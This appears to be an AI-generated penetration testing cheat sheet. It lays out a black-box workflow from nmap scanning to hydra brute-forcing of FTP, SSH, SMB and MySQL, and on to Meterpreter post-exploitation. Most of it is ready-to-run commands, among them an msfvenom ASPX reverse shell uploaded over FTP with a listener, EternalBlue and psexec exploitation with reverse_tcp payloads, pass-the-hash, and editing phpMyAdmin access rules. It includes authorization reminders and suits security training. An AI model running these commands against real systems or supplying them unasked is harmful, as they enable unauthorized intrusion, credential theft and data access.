
# Black-Box Pentest — Port Scanning & Targeting Workflows

> **Reminder / Rules of engagement:** Only perform these actions on systems you are explicitly authorized to test. Log everything and follow your scope/ROE.

---

## Port scanning & enumeration (practical)

### 1) Quick discovery → deeper scan
Start with a quick service/version scan to see what's up:
```bash
nmap -sV <target-ip>
```

Then run a more comprehensive scan while capturing output for later analysis:

```bash
nmap -p1-10000 -T4 -sC -sV -PA <target-ip> -oX nmapp10k.xml
```

* `-PA` = ACK/active probe; `-sC` runs default scripts; `-sV` version detection.
* `-oX` saves XML (useful for importing into other tools).

While the big scan runs, do targeted banner grabbing:

```bash
nc -nv <target-ip> <port>
```

* Inspect the banner, then visit the service in a browser (http\://<ip>:<port>) if it's a web service.

### 2) Import scan into Metasploit DB (if using msfconsole)

If msfdb is running and you want to inspect hosts/services:

```text
# in msfconsole
db_import /root/Desktop/nmapp10k.xml
hosts
services
```

Pick targets quickly — avoid dead ends and rabbit holes.

---

## Targeting: Microsoft IIS + FTP (practical flow)

When both HTTP (80) and FTP (21) are open and appear to be Microsoft services, they may be related (web content deployed via FTP).

1. **Check anonymous FTP**

```bash
# nmap script
nmap --script ftp-anon -p21 <target-ip>
```

2. **Brute-force FTP (if allowed)**

```bash
hydra -L users.txt -P passwords.txt ftp://<target-ip>
# or: hydra -l username -P passwords.txt ftp://<target-ip>
```

3. **Manual FTP access**

```bash
ftp <target-ip> 21
# then browse files and directories, look for .asp/.aspx or upload points
```

4. **If you find .asp/.aspx and can upload**
   Generate an ASP reverse shell payload (example using msfvenom):

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<your-ip> LPORT=1234 -f aspx -o payload.aspx
```

Upload `payload.aspx` via the FTP session:

```text
put payload.aspx
```

5. **Start handler and request payload**

```text
# start multi/handler in msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST <your-ip>
set LPORT 1234
run
```

Visit `http://<target-ip>/payload.aspx` in browser (or trigger it) to get the shell.

> Tip: msfvenom `-f aspx` generates server-side ASP payloads — match payload type to the server.

---

## Targeting OpenSSH (practical)

1. **Try credentials you already have**:

```bash
ssh user@<target-ip>
```

2. **Brute-force with Hydra (if allowed)**:

```bash
hydra -l vagrant -P /path/to/wordlist.txt ssh://<target-ip>
```

3. **Mass-check / module in Metasploit**:

```text
# in msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USERNAME vagrant
set PASS_FILE /path/to/passwords.txt
run
```

4. **If you get a shell**:

* For an interactive shell: `bash` (or `python -c 'import pty; pty.spawn("/bin/bash")'`).
* To upgrade a shell to Meterpreter: upload a Meterpreter payload/executable and run it (only in-scope targets).

---

## Targeting SMB (port 445) — enumeration → exploitation

### Enumeration

```bash
# list shares and info
smbclient -L //<target-ip> -N            # anonymous
smbclient -L //<target-ip> -U username  # with username prompt

# enumerate with smbmap
smbmap -H <target-ip> -u username -p password

# enum with enum4linux
enum4linux -a <target-ip>
```

### Brute-force user creds (if allowed)

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://<target-ip>
```

### Using Impacket's psexec or Metasploit psexec

* Impacket:

```bash
# from impacket examples (psexec.py)
python3 /usr/share/doc/impacket/examples/psexec.py Administrator@<target-ip> -hashes LMHASH:NTHASH
```

* Metasploit:

```text
# in msfconsole
use exploit/windows/smb/psexec
set RHOSTS <target-ip>
set SMBUser Administrator
set SMBPass <password>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run
```

### If you *do not* have creds

Check for SMB vulns (e.g., MS17-010 / EternalBlue). Use search and test in lab first:

```text
# in msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
run
```

Once you have a session:

```text
sysinfo
getuid
getprivs
```

---

## Targeting MySQL / WAMP / phpMyAdmin (practical chain)

1. **Detect MySQL and WAMP**

```bash
nmap -sC -sV -p 3306,8585 <target-ip>
```

* Port `3306` is MySQL; `8585` might be a WAMP control panel or web interface.

2. **Search for exploits**

```bash
searchsploit "MySQL 5.5"
```

3. **Try MySQL login brute or known creds**

```bash
# Metasploit
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-ip>
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run

# direct test
mysql -u root -p -h <target-ip>
```

4. **If you find a WordPress DB and WAMP with phpMyAdmin only bound to 127.0.0.1**
   A common escalation *chain*:

* Gain code execution on the host (e.g., via SMB exploit like EternalBlue).
* Navigate to WAMP/Apache web root and find `wp-config.php` to get DB credentials.

  ```text
  # Meterpreter shell example
  cd C:\\wamp\\www\\wordpress
  cat wp-config.php
  ```
* If phpMyAdmin is restricted to `127.0.0.1`, you can:

  * Modify Apache/WAMP `phpmyadmin.conf` to allow your IP, upload it back and restart Apache (only in authorized tests).
  * Example workflow (meterpreter):

    1. `download C:\wamp\alias\phpmyadmin.conf` (or use `cat` to view).
    2. Edit locally: change `Require local` / `Deny from` to allow your IP (be careful: only change in test lab).
    3. `upload phpmyadmin.conf C:\wamp\alias\phpmyadmin.conf`
    4. Restart Apache/WAMP:

       ```text
       # in meterpreter shell
       shell
       net stop wampapache
       net start wampapache
       ```
    5. Reload phpMyAdmin in your browser and authenticate (or use discovered DB creds).

> Note: service names and file paths vary with WAMP/XAMPP distributions. Always inspect the target before editing config files.

---

## Practical notes on chaining & prioritization

* **Aim for high-signal services first**: SMB, RDP, HTTP management panels, FTP upload areas.
* **Use credentials when available** — credential reuse is common and high-value.
* **Chain carefully**: e.g., SMB exploit → SYSTEM → access `C:\wamp\www` → find `wp-config.php` → obtain DB creds → modify configs or access phpMyAdmin locally.
* **Document each step** (commands, timestamps, outputs) for reporting and reproducibility.

---

## Short troubleshooting & tips

* If a web change still shows `403 Forbidden`, ensure you restarted Apache/WAMP and cleared browser cache.
* When modifying remote files, keep backups (download originals first).
* msfconsole modules like `ssh_login`, `mysql_login`, or scanners often require `RHOSTS` and wordlist paths. Read module `info` and `options`.
* Test destructive or risky steps in an isolated VM snapshot first.

---

## Example quick checklist (copy/paste)

```text
1. Quick nmap -sV to identify services.
2. Run full scan (nmap -p1-10000 -sC -sV -PA).
3. While scanning: banner grab with nc and manually inspect web pages.
4. Import XML into msfconsole if desired (db_import).
5. Prioritize targets: FTP/HTTP with upload, SMB, SSH, DB panels.
6. Attempt low-effort wins: anonymous FTP, default creds, exposed admin panels.
7. If uploadable: upload webshell (msfvenom) and set handler.
8. If SMB/OS exploit available: test in lab, then (if allowed) run against target.
9. After foothold: collect creds, look for local web apps, and chain to sensitive assets (phpMyAdmin, WordPress, etc.).
10. Log everything and cleanup.
```

---

## Practical takeaways (your notes refined)

* Prioritize speed and efficiency — don't waste time on rabbit holes.
* Use both manual inspection (nc, browser) and automated scans.
* Many real engagements succeed via simple misconfigurations: anonymous FTP, weak creds, exposed admin panels.
* Chaining small findings (SMB → code exec → read `wp-config.php` → local phpMyAdmin access) is often how privilege and data access escalate.
* Always test in a controlled environment before using intrusive exploits on a client target.



Would you like me to merge this into the full Black-Box README now (so you get one single file)?
```
